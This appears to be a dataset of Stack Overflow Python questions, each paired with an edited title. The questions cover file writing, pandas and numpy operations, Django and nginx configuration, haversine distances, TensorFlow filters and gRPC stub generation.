how would i write to file with python," How would I write the scores to a file? <code>  import randomscore=0question=0for i in range(10): num1= random.randint(1,10) num2= random.randint(1,10) ops = ['+', '-', '*'] operation = random.choice(ops) Q = int(input(str(num1)+operation+str(num2))) if operation =='+': answer=num1+num2 if Q == answer: print (""correct"") score=score+1 else: print('You Fail') elif operation =='-': answer=num1-num2 if Q == answer: print (""correct"") score=score+1 else: print(""you fail"") else: answer=num1*num2 if Q == answer: print (""correct"") score=score+1 else: print(""you fail"")print(""thank you for playing your score is"",score)",How to write to file with Python?
Write a Python function that calls another function and optionally keeping default arguments," I have a function with one optional argument, like this: I want to write a new function that calls funA and also has an optional argument, but if no argument is passed, I want to keep the default in funA.I was thinking something like this: Is there a more pythonic way of doing this? <code>  def funA(x, a, b=1): return a+b*x def funB(x, a, b=None): if b: return funA(x, a, b) else: return funA(x, a)",Call another function and optionally keep default arguments
Write a Python function that calls another function and optionally keeps default arguments," I have a function with one optional argument, like this: I want to write a new function that calls funA and also has an optional argument, but if no argument is passed, I want to keep the default in funA.I was thinking something like this: Is there a more pythonic way of doing this? <code>  def funA(x, a, b=1): return a+b*x def funB(x, a, b=None): if b: return funA(x, a, b) else: return funA(x, a)",Call another function and optionally keep default arguments
Why Python's list not have a shift/unshift methods?," I am wondering why the default list in Python does not have any shift, unshift methods. Maybe there is an obvious reason for it like the way the lists are ordered in memory. So currently, I know that I can use append to add an item at the end of a list and pop to remove an element from the end. However, I can only use list concatenation to imitate the behavior of a missing shift or unshift method. Did I miss something? <code>  >>> a = [1,2,3,4,5]>>> a = [0] + a # Unshift / Push>>> a[0,1,2,3,4,5]>>> a = a[1:] # Shift / UnPush>>> a[1,2,3,4,5]",Why Python's list does not have shift/unshift methods?
Empty REMOTE_ADDR value in Django application when using nginx as reverse proxy in front of gunicorn," I have nginx set up as reverse proxy, with gunicorn in the background. This web-server set up feeds my Django app, that has a postgresql backend. The whole set up is hosted on two Ubuntu machines (one's the application machine, other's the DB machine).I tested this set up solely via gunicorn, without nginx. Worked perfectly. Next to get it up for production, I added the nginx reverse proxy in front of gunicorn. Immediately I ran into a debilitating error: invalid input syntax for type inet: """" (comes when a user tries to log into my Django app)The IPs of users who log into my app are saved in a session table; Django does that on its own. Now it's a known fact that Postgresql requires all client IPs to be of the INET sort (some other DBs allow string IPs too, but not postgres). INET type doesn't allow """" (i.e. empty) values, and instead throws an error invalid input syntax for type inet: """".In other words, my nginx reverse proxy is not sending the value for REMOTE_ADDR to the Django app. Solely using gunicorn correctly sets that value (and hence everything works). How do I get nginx to pass an $remote_addr value to REMOTE_ADDR in Django's request.META? I've tried including proto_set_header REMOTE_ADDR $remote_addr; in the location block in my /etc/nginx/sites-avaialble/myproject file. It does NOT work - I can see a HTTP_REMOTE_ADDR value in request.META in the aftermath, but REMOTE_ADDR is still ' '. So how do I set REMOTE_ADDR (i.e. the client's IP address) field in Django's request.META? Maybe I can pass it explicitly via gunicorn? Someone mentioned I should handle it at the DB end - I'm not sure how I can do that? Should I edit pg_hba.conf or postgresql.conf or something? I've looked into those files, there's no option to 'allow null values for IPs' to be logged. Moreover, I'd rather pass whatever value resides in $remote_addr to Django, instead of letting all logged in users' IPs be null. And let's not forget that if I use solely gunicorn, REMOTE_ADDR in Django's request.META gets correctly set; so my guess is the problem lies with how I'm passing it via nginx.Please help! And feel free to ask for more information if you feel you need it. /etc/nginx/sites-available/myproject: /etc/nginx/proxy_params: <code>  server { listen 80; server_name example.cloudapp.net; charset utf-8; underscores_in_headers on; location = /favicon.ico { access_log off; log_not_found off; } location /static/ { root /home/mhb11/folder/myproject; } location / { proxy_pass_request_headers on; include proxy_params; proxy_pass http://unix:/home/mhb11/folder/myproject/myproject.sock; } error_page 500 502 503 504 /500.html; location = /500.html { root /home/mhb11/folder/myproject/templates/; }} proxy_set_header Host $host;proxy_set_header User-Agent $http_user_agent;proxy_set_header X-Real-IP $remote_addr;proxy_set_header REMOTE_ADDR $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_set_header X-Forwarded-Proto $scheme;","Empty REMOTE_ADDR value in Django application, when using nginx as reverse proxy with gunicorn"
Replace NaN with 0 in numpy arrays efficiently," I am dividing two numpy arrays: I am looking for a way to get 0 instead of Nan without using for loops?Does numpy have a similar function to fillna() in pandas? <code>  >>> import numpy as np>>> a1 = np.array([[ 0, 3], [ 0, 2]])>>> a2 = np.array([[ 0, 3], [ 0, 1]])>>> d = a1/a2>>> darray([[ nan, 1.], [ nan, 2.]])>>> where_are_NaNs = np.isnan(d)>>> d[where_are_NaNs] = 0>>> d>>> array([[ 0., 1.], [ 0., 2.]])","After division by 0, replace NaN with 0 in numpy arrays"
how to install VLC pluge in in python," I was trying to install VLC using PIP, but get the following error: <code>  pip install VLCDownloading/unpacking vlcCannot fetch index base URL https://pypi.python.org/simple/Could not find any downloads that satisfy the requirement vlcCleaning up...No distributions at all found for vlcStoring complete log in C:\Users\rakeshb4\pip\pip.log",How to install the VLC module in Python
Pandas 'read_csv()' with missing/incomplete header or irregular column number," I have a file.csv with ~15k rows that looks like this I wanted it to be imported to pandas.DataFrame with any random value given to the column that don't have a header, something like this: This has been impossible to import, as i tried different solution, such as giving a specific a header, But still no joy, the only way i was able to make it work is to add a header manually in the .csv file. which kinda defeat the purpose of automation!Then i tried this solution:Doing this it correctly reads the files giving me a list of ~15k element values, each element is a list of string, where each string is correctly parsed data field from the file, but when i try to do this: or this: Then the non headered columns disappear and the order of columns is completely mixed. any idea of a possible solution ?  <code>  SAMPLE_TIME, POS, OFF, HISTOGRAM2015-07-15 16:41:56, 0-0-0-0-3, 1, 2,0,5,59,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2015-07-15 16:42:55, 0-0-0-0-3, 1, 0,0,5,9,0,0,0,0,0,2,0,0,0,50,0,2015-07-15 16:43:55, 0-0-0-0-3, 1, 0,0,5,5,0,0,0,0,0,2,0,0,0,0,4,0,0,0,2015-07-15 16:44:56, 0-0-0-0-3, 1, 2,0,5,0,0,0,0,0,0,2,0,0,0,6,0,0,0,0 SAMPLE_TIME, POS, OFF, HISTOGRAM 1 2 3 4 5 6 2015-07-15 16:41:56, 0-0-0-0-3, 1, 2, 0, 5, 59, 4, 0, 0, 2015-07-15 16:42:55, 0-0-0-0-3, 1, 0, 0, 5, 0, 6, 0, nan2015-07-15 16:43:55, 0-0-0-0-3, 1, 0, 0, 5, 0, 7, nan nan2015-07-15 16:44:56, 0-0-0-0-3, 1, 2, 0, 5, 0, 0, 2, nan lines=list(csv.reader(open('file.csv'))) header, values = lines[0], lines[1:] data = {h:v for h,v in zip (header, zip(*values))}df = pd.DataFrame.from_dict(data) data2 = {h:v for h,v in zip (str(xrange(16)), zip(*values))}df2 = pd.DataFrame.from_dict(data)",read_csv with missing/incomplete header or irregular number of columns
Tensorflow Tutorial: Dublicated Shuffeling in the Input Pipeline," In the Tensorflow reading data tutorial an example input pipeline is given. In that pipeline the data is shuffled twice, inside the string_input_producer as well as in the shuffle batch generator. Here is the code: Does the second shuffle serve any useful purpose? The shuffle batch generator has the disadvantage that min_after_dequeue examples are always stored pre-loaded in the memory to allow a useful shuffle. I do have image data which is quite heavy in memory consumption. That is why I am considering to use a normal batch generator instead. Is there any advantage in shuffling the data twice?Edit: Additional Question, why is the string_input_producer initialized only with default capacity of 32? Wouldn't it be advantageous to have a multiple of batch_size as capacity? <code>  def input_pipeline(filenames, batch_size, num_epochs=None): # Fist shuffle in the input pipeline filename_queue = tf.train.string_input_producer( filenames, num_epochs=num_epochs, shuffle=True) example, label = read_my_file_format(filename_queue) min_after_dequeue = 10000 capacity = min_after_dequeue + 3 * batch_size # Second shuffle as part of the batching. # Requiring min_after_dequeue preloaded images example_batch, label_batch = tf.train.shuffle_batch( [example, label], batch_size=batch_size, capacity=capacity, min_after_dequeue=min_after_dequeue) return example_batch, label_batch",Tensorflow Tutorial: Duplicated Shuffling in the Input Pipeline
Confused a bit about django INSTALLED_APPS naming convention," The tutorial on the site creates an app named polls. It's using django 1.9, so in the INSTALLED_APPS it is: I'm watching a tutorial he names the app newsletter and in INSTALLED_APPS he has he's using 1.8, though. I am using 1.9. I've watched other tutorials and they also just add a name without dots in the syntax as he does. I realize things may be different, that's understood. To be clear if I named my app dogs,. in the installed apps it would be named like this or if it was tree it would be Is that how the naming convention goes? also I would assume things would get shorter in newer versions and more convenient. so to go from just adding to having to type out seems weird to me. But I'm new so I maybe missing something. Any and all advice is welcome <code>  polls.apps.PollsConfig newsletter dogs.apps.DogsConfig tree.apps.TreeConfig newsletter, polls.apps.PollsConfig","How does it work, the naming convention for Django INSTALLED_APPS?"
How does it work the name convention for Django INSTALLED_APPS?," The tutorial on the site creates an app named polls. It's using django 1.9, so in the INSTALLED_APPS it is: I'm watching a tutorial he names the app newsletter and in INSTALLED_APPS he has he's using 1.8, though. I am using 1.9. I've watched other tutorials and they also just add a name without dots in the syntax as he does. I realize things may be different, that's understood. To be clear if I named my app dogs,. in the installed apps it would be named like this or if it was tree it would be Is that how the naming convention goes? also I would assume things would get shorter in newer versions and more convenient. so to go from just adding to having to type out seems weird to me. But I'm new so I maybe missing something. Any and all advice is welcome <code>  polls.apps.PollsConfig newsletter dogs.apps.DogsConfig tree.apps.TreeConfig newsletter, polls.apps.PollsConfig","How does it work, the naming convention for Django INSTALLED_APPS?"
Unpacking tuple-like textfile - python," Given a textfile of lines of 3-tuples: The goal is to achieve two different data types:sents_with_positions: a list of list of tuples where the the tuples looks like each line of the textfilesents_words: a list of list of string made up of only the third element in the tuples from each line of the textfileE.g. From the input textfile: I have been doing it by:iterating through each line of the textfile, process the tuple, and then appending them to a list to get sents_with_positionsand while appending each process sentence to sents_with_positions, I append the last elements of the tuples for each sentence to sents_wordsCode: But is there a simpler way or cleaner way to do achieve the same output? Maybe through regexes? Or some itertools trick?Note that there are cases where there're tricky tuples in the lines of the textfile, e.g.(86, 87, )) # Sometimes the token/word is a bracket(96, 97, ()(87, 88, ,) # Sometimes the token/word is a comma(29, 33, Caf) # The token/word is a unicode (sometimes accented), so [a-zA-Z] might be insufficient(2, 3, 2) # Sometimes the token/word is a number(47, 52, 3,000) # Sometimes the token/word is a number/word with comma(23, 29, (e.g.)) # Someimtes the token/word contains bracket. <code>  (0, 12, Tokenization)(13, 15, is)(16, 22, widely)(23, 31, regarded)(32, 34, as)(35, 36, a)(37, 43, solved)(44, 51, problem)(52, 55, due)(56, 58, to)(59, 62, the)(63, 67, high)(68, 76, accuracy)(77, 81, that)(82, 91, rulebased)(92, 102, tokenizers)(103, 110, achieve)(110, 111, .)(0, 3, But)(4, 14, rule-based)(15, 25, tokenizers)(26, 29, are)(30, 34, hard)(35, 37, to)(38, 46, maintain)(47, 50, and)(51, 56, their)(57, 62, rules)(63, 71, language)(72, 80, specific)(80, 81, .)(0, 2, We)(3, 7, show)(8, 12, that)(13, 17, high)(18, 26, accuracy)(27, 31, word)(32, 35, and)(36, 44, sentence)(45, 57, segmentation)(58, 61, can)(62, 64, be)(65, 73, achieved)(74, 76, by)(77, 82, using)(83, 93, supervised)(94, 102, sequence)(103, 111, labeling)(112, 114, on)(115, 118, the)(119, 128, character)(129, 134, level)(135, 143, combined)(144, 148, with)(149, 161, unsupervised)(162, 169, feature)(170, 178, learning)(178, 179, .)(0, 2, We)(3, 12, evaluated)(13, 16, our)(17, 23, method)(24, 26, on)(27, 32, three)(33, 42, languages)(43, 46, and)(47, 55, obtained)(56, 61, error)(62, 67, rates)(68, 70, of)(71, 75, 0.27)(76, 77, )(78, 79, ()(79, 86, English)(86, 87, ))(87, 88, ,)(89, 93, 0.35)(94, 95, )(96, 97, ()(97, 102, Dutch)(102, 103, ))(104, 107, and)(108, 112, 0.76)(113, 114, )(115, 116, ()(116, 123, Italian)(123, 124, ))(125, 128, for)(129, 132, our)(133, 137, best)(138, 144, models)(144, 145, .) sents_words = [ ('Tokenization', 'is', 'widely', 'regarded', 'as', 'a', 'solved', 'problem', 'due', 'to', 'the', 'high', 'accuracy', 'that', 'rulebased', 'tokenizers', 'achieve', '.'), ('But', 'rule-based', 'tokenizers', 'are', 'hard', 'to', 'maintain', 'and', 'their', 'rules', 'language', 'specific', '.'), ('We', 'show', 'that', 'high', 'accuracy', 'word', 'and', 'sentence', 'segmentation', 'can', 'be', 'achieved', 'by', 'using', 'supervised', 'sequence', 'labeling', 'on', 'the', 'character', 'level', 'combined', 'with', 'unsupervised', 'feature', 'learning', '.')]sents_with_positions = [ [(0, 12, 'Tokenization'), (13, 15, 'is'), (16, 22, 'widely'), (23, 31, 'regarded'), (32, 34, 'as'), (35, 36, 'a'), (37, 43, 'solved'), (44, 51, 'problem'), (52, 55, 'due'), (56, 58, 'to'), (59, 62, 'the'), (63, 67, 'high'), (68, 76, 'accuracy'), (77, 81, 'that'), (82, 91, 'rulebased'), (92, 102, 'tokenizers'), (103, 110, 'achieve'), (110, 111, '.')], [(0, 3, 'But'), (4, 14, 'rule-based'), (15, 25, 'tokenizers'), (26, 29, 'are'), (30, 34, 'hard'), (35, 37, 'to'), (38, 46, 'maintain'), (47, 50, 'and'), (51, 56, 'their'), (57, 62, 'rules'), (63, 71, 'language'), (72, 80, 'specific'), (80, 81, '.')], [(0, 2, 'We'), (3, 7, 'show'), (8, 12, 'that'), (13, 17, 'high'), (18, 26, 'accuracy'), (27, 31, 'word'), (32, 35, 'and'), (36, 44, 'sentence'), (45, 57, 'segmentation'), (58, 61, 'can'), (62, 64, 'be'), (65, 73, 'achieved'), (74, 76, 'by'), (77, 82, 'using'), (83, 93, 'supervised'), (94, 102, 'sequence'), (103, 111, 'labeling'), (112, 114, 'on'), (115, 118, 'the'), (119, 128, 'character'), (129, 134, 'level'), (135, 143, 'combined'), (144, 148, 'with'), (149, 161, 'unsupervised'), (162, 169, 'feature'), (170, 178, 'learning'), (178, 179, '.')]] sents_with_positions = []sents_words = []_sent = []for line in _input.split('\n'): if len(line.strip()) > 0: line = line[1:-1] start, _, next = line.partition(',') end, _, next = next.partition(',') text = next.strip() _sent.append((int(start), int(end), text)) else: sents_with_positions.append(_sent) sents_words.append(list(zip(*_sent))[2]) _sent = []",Unpacking tuple-like textfile
Pandas-style transform of grouped data on pyspark DataFrame," If we have a Pandas data frame consisting of a column of categories and a column of values, we can remove the mean in each category by doing the following: As far as I understand, Spark dataframes do not directly offer this group-by/transform operation (I am using PySpark on Spark 1.5.0). So, what is the best way to implement this computation? I have tried using a group-by/join as follows: But it is very slow since, as I understand, each category requires a full scan of the DataFrame. I think (but have not verified) that I can speed this up a great deal if I collect the result of the group-by/mean into a dictionary, and then use that dictionary in a UDF as follows: Is there an idiomatic way to express this type of operation without sacrificing performance? <code>  df[""DemeanedValues""] = df.groupby(""Category"")[""Values""].transform(lambda g: g - numpy.mean(g)) df2 = df.groupBy(""Category"").mean(""Values"")df3 = df2.join(df) nameToMean = {...}f = lambda category, value: value - nameToMean[category]categoryDemeaned = pyspark.sql.functions.udf(f, pyspark.sql.types.DoubleType())df = df.withColumn(""DemeanedValue"", categoryDemeaned(df.Category, df.Value))",Pandas-style transform of grouped data on PySpark DataFrame
How to vectorize the calculation of a distance matrix given a list of coordinates?," I am trying to calculate a distance matrix for a long list of locations identified by Latitude & Longitude using the Haversine formula that takes two tuples of coordinate pairs to produce the distance: I can calculate the distance between all points using a nested for loop as follows: using a simple function: But this takes quite a while given the time complexity, running at around 20s for 500 points and I have a much longer list. This has me looking at vectorization, and I've come across numpy.vectorize ((docs), but can't figure out how to apply it in this context.  <code>  def haversine(point1, point2, miles=False): """""" Calculate the great-circle distance bewteen two points on the Earth surface. :input: two 2-tuples, containing the latitude and longitude of each point in decimal degrees. Example: haversine((45.7597, 4.8422), (48.8567, 2.3508)) :output: Returns the distance bewteen the two points. The default unit is kilometers. Miles can be returned if the ``miles`` parameter is set to True. """""" data.head() id coordinates0 1 (16.3457688674, 6.30354512503)1 2 (12.494749307, 28.6263955635)2 3 (27.794615136, 60.0324947881)3 4 (44.4269923769, 110.114216113)4 5 (-69.8540884125, 87.9468778773) distance = {}def haver_loop(df): for i, point1 in df.iterrows(): distance[i] = [] for j, point2 in df.iterrows(): distance[i].append(haversine(point1.coordinates, point2.coordinates)) return pd.DataFrame.from_dict(distance, orient='index')",Vectorizing Haversine distance calculation in Python
How do I make Python 3.5 my default version, I have just installed Python 3.5.1 on my Mac (running the latest version of OSX). My system came with Python 2.7 installed. When I type IDLE at the Terminal prompt my system pulls up the original Python 2.7 rather than the newly installed Python 3.5. How do I get my system to default to Python 3.5.1 when I open the IDLE window from Terminal? <code> ,How do I make Python 3.5 my default version on MacOS?
haversine distance calculation with two numpy arrays," I have two arrays with lat and long. I want to calculate distance between every pair of lat and long with every other pair of lat and long in the array. Here are my two arrays. After conversion into radians. Now I want distance between first pair of lat and long with remaining pairs of lat and long and so on. And want to print the pairs and the corresponding distance.This is what I am doing in python. It gives me an error IndexError: index 56 is out of bounds for axis 0 with size 56 Where I am doing it wrong? And how to make calculation faster if the array is big? Please help. <code>  lat_arrayarray([ 0.33356456, 0.33355585, 0.33355585, 0.33401788, 0.33370132, 0.33370132, 0.33370132, 0.33371075, 0.33371075, 0.33370132, 0.33370132, 0.33370132, 0.33356488, 0.33356488, 0.33370132, 0.33370132, 0.33370132, 0.33401788, 0.33362632, 0.33362632, 0.33364007, 0.33370132, 0.33401788, 0.33401788, 0.33358399, 0.33358399, 0.33358399, 0.33370132, 0.33370132, 0.33362632, 0.33370132, 0.33370132, 0.33370132, 0.33370132, 0.33370132, 0.33356488, 0.33356456, 0.33391071, 0.33370132, 0.33356488, 0.33356488, 0.33356456, 0.33356456, 0.33356456, 0.33362632, 0.33364804, 0.3336314 , 0.33370132, 0.33370132, 0.33370132, 0.33364034, 0.33359921, 0.33370132, 0.33360397, 0.33348863, 0.33370132])long_arrayarray([ 1.27253229, 1.27249141, 1.27249141, 1.27259085, 1.2724337 , 1.2724337 , 1.2724337 , 1.27246931, 1.27246931, 1.2724337 , 1.2724337 , 1.2724337 , 1.27254305, 1.27254305, 1.2724337 , 1.2724337 , 1.2724337 , 1.27259085, 1.27250461, 1.27250461, 1.27251211, 1.2724337 , 1.27259085, 1.27259085, 1.27252134, 1.27252134, 1.27252134, 1.2724337 , 1.2724337 , 1.27250461, 1.2724337 , 1.2724337 , 1.2724337 , 1.2724337 , 1.2724337 , 1.27254305, 1.27253229, 1.27266808, 1.2724337 , 1.27254305, 1.27254305, 1.27253229, 1.27253229, 1.27253229, 1.27250461, 1.27250534, 1.27250184, 1.2724337 , 1.2724337 , 1.2724337 , 1.27251339, 1.27223739, 1.2724337 , 1.2722575 , 1.27237575, 1.2724337 ]) distance = []R = 6371.0for i in range(len(lat_array)): for j in (i+1,len(lat_array)): dlon = long_array[j]-long_array[i] dlat = lat_array[j]-lat_array[i] a = sin(dlat / 2)**2 + cos(lat_array[i]) * cos(lat_array[j]) * sin(dlon / 2)**2 c = 2 * atan2(sqrt(a), sqrt(1 - a)) distance.append(R * c)",Pairwise haversine distance calculation
Python: Keep firstly found duplicate items in a list," I have a list that looks like this: I want to keep the firstly found duplicate items in this list, based on the first item in every tuple: Is there an efficient way to do this? <code>  [(1, 0.3), (3, 0.2), (3, 0.15), (1, 0.07), (1, 0.02), (2, 0.01)] [(1, 0.3), (3, 0.2), (2, 0.01)]",Keep firstly found duplicate items in a list
Double vs. single quotes using formated prinitng in python," So I was going through ""Learn Python the Hard Way""and while doing this: the output was But I'm not sure why the 3rd string has double strings. <code>  formatter = ""%r %r %r %r""print formatter % ( ""I had this thing."", ""That you could up right."", ""But it didn't sing."", ""So I said goodnight"") 'I had this thing.' 'That you could up right.' ""But it didn't sing."" 'So I said goodnight'",Double vs. single quotes using formatted printing in python
catching exception from called function," I have a function that reads a CSV, checks the values in the rows, and if everything is okay, it writes the rows to a new CSV file. I have a few validation functions I'm calling within my main function to check the value and format of the rows. I'm trying to implement my main function in a way so that when I call the other validation functions and something doesn't check out, I skip writing that row entirely. At the moment, the writer is still writing rows that should be skipped. For example, if a number is not divisible by 5, instead of skipping that row, the writer is just writing ''.So, how can I handle the exception (ValueError) raised in divisible_by_5 in my for loop so I don't write lines that raise an exception?  <code>  #main functionfor row in reader: try: row['amnt'] = divisible_by_5(row['amnt']) row['issue_d'] = date_to_iso(row['issue_d']) writer.writerow(row) except: continue#Validation functiondef divisible_by_5(value): try: float_value = float(value) if float_value % 5 == 0 and float_value != 0: return float_value else: raise ValueError except ValueError: return None",Catching exception from a called function
"ValueError: not enough values to unpack (expected 11, got 1) in python"," I wrote a script for system automation, but I'm getting the error described in the title. My code below is the relevant portion of the script. What is the problem? <code>  import csvimport osDIR = ""C:/Users/Administrator/Desktop/key_list.csv""def Customer_List(csv): customer = open(DIR) for line in customer: row = [] (row['MEM_ID'], row['MEM_SQ'], row['X_AUTH_USER'], row['X_AUTH_KEY'], row['X_STORAGE_URL'], row['ACCESSKEY'], row['ACCESSKEYID'], row['ACCESSKEY1'], row['ACCESSKEYID1'], row['ACCESSKEY2'], row['ACCESSKEYID2'])=line.split() if csv == row['MEM_ID']: customer.close() return(row) else: print (""Not search for ID"") return([])id_input = input(""Please input the Customer ID(Email): "")result = Customer_List(id_input)if result: print (""iD: "" + id['MEM_ID']","ValueError: not enough values to unpack (expected 11, got 1)"
Why time() below 0.25 skips animation in python?," This code works as expected. Output: Code: And this code doesn't. Output: Code: Why does the time function seem to skip every second print statement if it is lower than 0.25? <code>  Loading Loading.Loading..Loading... done = Falsecount = 0while not done: print '{0}\r'.format(""Loading""), time.sleep(0.25) print '{0}\r'.format(""Loading.""), time.sleep(0.25) print '{0}\r'.format(""Loading..""), time.sleep(0.25) print '{0}\r'.format(""Loading...""), time.sleep(0.25) count += 1 if count == 5: done = True Loading.Loading... done = Falsecount = 0while not done: print '{0}\r'.format(""Loading""), time.sleep(0.125) print '{0}\r'.format(""Loading.""), time.sleep(0.125) print '{0}\r'.format(""Loading..""), time.sleep(0.125) print '{0}\r'.format(""Loading...""), time.sleep(0.125) count += 1 if count == 5: done = True",Why time() below 0.25 skips animation in Python?
Remote connection to MS SQL - Error using pyodbc vs Success using0 MSQL Studio Express," I have a MS SQL database in the same network but in other computer.Using the SQL Server Management Studio (SSMS) Express, I can find the database and connect without problems.But when I use pyodbc to connect to the same server using: I get following error: OBS: I guess that the server string should be right, since if I change it I get always the following error: Here the image showing success while using SQL Server Studio Express to connect remotely. <code>  import pyodbcserver = r""xxxER\xxxSQLSERV""db = ""xxxDB""user = ""xxx""password = ""xxxx""conn = pyodbc.connect('DRIVER={SQL Server};SERVER='+server + ';DATABASE=' + db +';UID=' + user + ';PWD=' + password) pyodbc.OperationalError: ('HYT00', '[HYT00] [Microsoft][ODBC SQL Server Driver]Login timeout expired (0) (SQLDriverConnect)') pyodbc.Error: ('08001', '[08001] [Microsoft][ODBC SQL Server Driver][DBNETLIB]SQL Server does not exist or access denied. (17) (SQLDriverConnect); [01000] [Microsoft][ODBC SQL Server Driver][DBNETLIB]ConnectionOpen (Connect()). (53)')",Remote connection to MS SQL - Error using pyodbc vs success using SQL Server Management Studio
"Ipython notebook (juypter),opencv (cv2) and plotting?"," Is there a way to use and plot with opencv2 with ipython notebook?I am fairly new to python image analysis. I decided to go with the notebook work flow to make nice record as I process and it has been working out quite well using matplotlib/pylab to plot things.An initial hurdle I had was how to plot things within the notebook. Easy, just use magic: Later, I wanted to perform manipulations with interactive plots but plotting in a dedicated window would always freeze. Fine, I learnt again that you need to use magic. Instead of just importing the modules: Now I have moved onto working with opencv. I am now back to the same problem, where I either want to plot inline or use dedicated, interactive windows depending on the task at hand. Is there similar magic to use? Is there another way to get things working? Or am I stuck and need to just go back to running a program from IDLE?As a side note: I know that opencv has installed correctly. Firstly, because I got no errors either installing or importing the cv2 module. Secondly, because I can read in images with cv2 and then plot them with something else. <code>  %matplotlib inline %pylab","Ipython notebook (jupyter),opencv (cv2) and plotting?"
"Sort a nested list by the two elements in it's element, but only reverse one"," Let's say I have a list like below: I want sort it to: So first sort it in descending order by the score and then sort it in ascending order by the name.I've tried: It's working, so now I just need reverse it: Ah, reverse=True simply reversed the list but didn't give the expect output. So I just want reverse the output of int(x[1]), but not x[0]. How can I do that? <code>  [['Harry', '4'], ['Anthony', '10'], ['Adam', '7'], ['Joe', '6'], ['Ben', '10']]# we can say the first element in it's lists is `name`, the second is `score` [['Anthony', '10'], ['Ben', '10'], ['Adam', '7'], ['Joe', '6'], ['Harry', '4']] >>> sorted(l, key=lambda x: (int(x[1]), x[0]))[['Harry', '4'], ['Joe', '6'], ['Adam', '7'], ['Anthony', '10'], ['Ben', '10']] >>> sorted(l, key=lambda x: (int(x[1]), x[0]), reverse=True)[['Ben', '10'], ['Anthony', '10'], ['Adam', '7'], ['Joe', '6'], ['Harry', '4']]",Sort a nested list by two elements
protoc-gen-grpc: Plugin failed with status code 1," As the question says, I compiled grpc from source and also did sudo pip install grpcio, however, the which grpc_python_plugin doesn't return anything. This is a problem because the grpc python example for route_guide requires me to run protoc -I . --python_out=. --grpc_out=. --plugin=protoc-gen-grpc='which grpc_python_plugin' ./route_guide.proto in order to generate the python stubs. Since, which grpc_python_plugin doesn't return anything, I get the following error: If I shorten the command I'm trying to run to:protoc -I . --python_out=. ./route_guide.proto, it generates the route_guide_pb2.py file but without the Servicer and Stub classes, and server and stub methods. Ofc, these methods are necessary if one wants to use grpc for any purpose. Any help would be appreciated. <code>  : program not found or is not executable--grpc_out: protoc-gen-grpc: Plugin failed with status code 1.",Python grpc protobuf stubs generation issue: --grpc_out: protoc-gen-grpc: Plugin failed with status code 1
Django : How to access request.user.id in javascript?," I have defined a get_queryset method in a viewset. Using javascript i want to display books of current user on one side and books of other all users on right side.I did all the code but could not access the current user id in my js file. I Want to access the user id like this. For all search i did , i got to know about adding this user id as a hidden field or passing this id .But i cant as the method only allows to return the queryset object. Can anyone please help me understand this.EDIT:MY SOLUTIONIn my views , i define the get_context_data method. In my template,i defined a hidden field: And in my JS:var x= document.getElementById(""author_id"").value; <code>  class BooksViewSet(ReadOnlyModelViewSet): serializer_class = BooksSerializer permission_classes = (IsAuthorizedToAccess, ) def get_queryset(self): queryset = Books.objects.all(); return queryset if(auther.id == ""current user id""){} def get_context_data(self, *args, **kwargs): ctx = super(class_name, self).get_context_data(*args, **kwargs) ctx[""author_id""]=self.request.user.id return ctx <input type=""hidden"" id=""userId"" value={{author_id}}>",Django : How to access current logged in user's id in javascript?
How to reshape a vector to tensorflow's filters?," I want to transfer some weights trained by another network to TensorFlow, the weights are stored in a single vector like this:[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18]By using numpy, I can reshape it to two 3 by 3 filters like this: Thus, the shape of my filters are (1,2,3,3). However, in TensorFlow, the shape of filters are (3,3,2,1): After reshaping the tf_weights to the expected shape, the weight becomes a mess and I can't get the expected convolution result.To be specific, when the shape of an image or filter is [number,channel,size,size], I wrote a convolution function and it gives the correct answer,but it's too slow: Instead, by using tensorflow's conv2d like this: The feature map I got is wrong. <code>  1 2 3 9 10 113 4 5 12 13 146 7 8 15 16 17 tf_weights = tf.Variable(tf.random_normal([3,3,2,1])) def convol(images,weights,biases,stride): """""" Args: images:input images or features, 4-D tensor weights:weights, 4-D tensor biases:biases, 1-D tensor stride:stride, a float number Returns: conv_feature: convolved feature map """""" image_num = images.shape[0] #the number of input images or feature maps channel = images.shape[1] #channels of an image,images's shape should be like [n,c,h,w] weight_num = weights.shape[0] #number of weights, weights' shape should be like [n,c,size,size] ksize = weights.shape[2] h = images.shape[2] w = images.shape[3] out_h = (h+np.floor(ksize/2)*2-ksize)/2+1 out_w = out_h conv_features = np.zeros([image_num,weight_num,out_h,out_w]) for i in range(image_num): image = images[i,...,...,...] for j in range(weight_num): sum_convol_feature = np.zeros([out_h,out_w]) for c in range(channel): #extract a single channel image channel_image = image[c,...,...] #pad the image padded_image = im_pad(channel_image,ksize/2) #transform this image to a vector im_col = im2col(padded_image,ksize,stride) weight = weights[j,c,...,...] weight_col = np.reshape(weight,[-1]) mul = np.dot(im_col,weight_col) convol_feature = np.reshape(mul,[out_h,out_w]) sum_convol_feature = sum_convol_feature + convol_feature conv_features[i,j,...,...] = sum_convol_feature + biases[j] return conv_features img = np.zeros([1,3,224,224])img = img - 1img = np.rollaxis(img, 1, 4)weight_array = googleNet.layers[1].weightsweight_array = np.reshape(weight_array,[64,3,7,7])biases_array = googleNet.layers[1].biasestf_weight = tf.Variable(weight_array)tf_img = tf.Variable(img)tf_img = tf.cast(tf_img,tf.float32)tf_biases = tf.Variable(biases_array)conv_feature = tf.nn.bias_add(tf.nn.conv2d(tf_img,tf_weight,strides=[1,2,2,1],padding='SAME'),tf_biases)sess = tf.Session()sess.run(tf.initialize_all_variables())feautre = sess.run(conv_feature)",How to reshape a vector to TensorFlow's filters?
NaturalKeyField has been implementation in django-rest-framework?," My design is as following about Django ModelSerializer.There are model A and model B. Model B has a foreign key field of Model A. For some reasons, I can not use the primary key directly to serialize Model B. As my thought, what I need is to serialize two other fields(unique together in Model A).And I see the SlugRelatedField must be used for one slug field. I searched there is a NaturalKeyField can support NaturalKeyField. But it looks like it is superseeded by django-rest-framework. But I checked the django-rest-framework, there is no such field at all.Can anyone help?? What should I do?The code is as following.Model A Model B Serializer of model A Serializer of model B The primary key of Model A is just a id Django auto added. When serialize the model B, I need to get the org and name of model A. Both read and write are needed. <code>  class AssetModel(models.Model): org = models.ForeignKey(Org, related_name='models') name = models.CharField(max_length=128) model_type = models.SmallIntegerField(default = 3,choices = MODEL_TYPE ) directory = models.CharField(max_length = 128) ... class Meta: unique_together = ('org', 'name',) class Dataitem(models.Model): mod = models.ForeignKey(AssetModel, related_name='dataitems') name = models.CharField(max_length=128) 